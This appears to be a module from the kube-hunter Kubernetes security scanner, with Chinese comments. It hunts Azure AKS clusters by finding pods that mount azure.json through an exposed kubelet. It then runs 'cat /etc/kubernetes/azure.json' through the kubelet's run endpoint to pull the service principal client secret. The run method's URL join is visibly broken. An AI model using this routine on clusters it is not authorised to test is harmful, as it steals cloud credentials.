# `.\kubehunter\kube_hunter\modules\hunting\aks.py`

```

# 导入所需的模块
import json
import logging
import requests

# 从 kube_hunter.conf 模块中导入 config 变量
from kube_hunter.conf import config
# 从 kube_hunter.modules.hunting.kubelet 模块中导入 ExposedRunHandler 类
from kube_hunter.modules.hunting.kubelet import ExposedRunHandler
# 从 kube_hunter.core.events 模块中导入 handler 类
from kube_hunter.core.events import handler
# 从 kube_hunter.core.events.types 模块中导入 Event, Vulnerability 类
from kube_hunter.core.events.types import Event, Vulnerability
# 从 kube_hunter.core.types 模块中导入 Hunter, ActiveHunter, IdentityTheft, Azure 类
from kube_hunter.core.types import Hunter, ActiveHunter, IdentityTheft, Azure

# 获取 logger 对象
logger = logging.getLogger(__name__)

# 定义 AzureSpnExposure 类，继承自 Vulnerability 和 Event 类
class AzureSpnExposure(Vulnerability, Event):
    """The SPN is exposed, potentially allowing an attacker to gain access to the Azure subscription"""

    def __init__(self, container):
        # 调用父类的构造函数
        Vulnerability.__init__(
            self, Azure, "Azure SPN Exposure", category=IdentityTheft, vid="KHV004",
        )
        self.container = container

# 使用 handler.subscribe 装饰器注册 ExposedRunHandler 类的事件处理函数
@handler.subscribe(ExposedRunHandler, predicate=lambda x: x.cloud == "Azure")
class AzureSpnHunter(Hunter):
    """AKS Hunting
    Hunting Azure cluster deployments using specific known configurations
    """

    def __init__(self, event):
        self.event = event
        self.base_url = f"https://{self.event.host}:{self.event.port}"

    # 获取具有访问 azure.json 文件权限的容器
    def get_key_container(self):
        endpoint = f"{self.base_url}/pods"
        logger.debug("Trying to find container with access to azure.json file")
        try:
            r = requests.get(endpoint, verify=False, timeout=config.network_timeout)
        except requests.Timeout:
            logger.debug("failed getting pod info")
        else:
            pods_data = r.json().get("items", [])
            for pod_data in pods_data:
                for container in pod_data["spec"]["containers"]:
                    for mount in container["volumeMounts"]:
                        path = mount["mountPath"]
                        if "/etc/kubernetes/azure.json".startswith(path):
                            return {
                                "name": container["name"],
                                "pod": pod_data["metadata"]["name"],
                                "namespace": pod_data["metadata"]["namespace"],
                            }

    # 执行函数
    def execute(self):
        container = self.get_key_container()
        if container:
            self.publish_event(AzureSpnExposure(container=container))

# 使用 handler.subscribe 装饰器注册 AzureSpnExposure 类的事件处理函数
@handler.subscribe(AzureSpnExposure)
class ProveAzureSpnExposure(ActiveHunter):
    """Azure SPN Hunter
    Gets the azure subscription file on the host by executing inside a container
    """

    def __init__(self, event):
        self.event = event
        self.base_url = f"https://{self.event.host}:{self.event.port}"

    # 运行函数
    def run(self, command, container):
        run_url = "/".join(self.base_url, "run", container["namespace"], container["pod"], container["name"])
        return requests.post(run_url, verify=False, params={"cmd": command}, timeout=config.network_timeout)

    # 执行函数
    def execute(self):
        try:
            subscription = self.run("cat /etc/kubernetes/azure.json", container=self.event.container).json()
        except requests.Timeout:
            logger.debug("failed to run command in container", exc_info=True)
        except json.decoder.JSONDecodeError:
            logger.warning("failed to parse SPN")
        else:
            if "subscriptionId" in subscription:
                self.event.subscriptionId = subscription["subscriptionId"]
                self.event.aadClientId = subscription["aadClientId"]
                self.event.aadClientSecret = subscription["aadClientSecret"]
                self.event.tenantId = subscription["tenantId"]
                self.event.evidence = f"subscription: {self.event.subscriptionId}"

```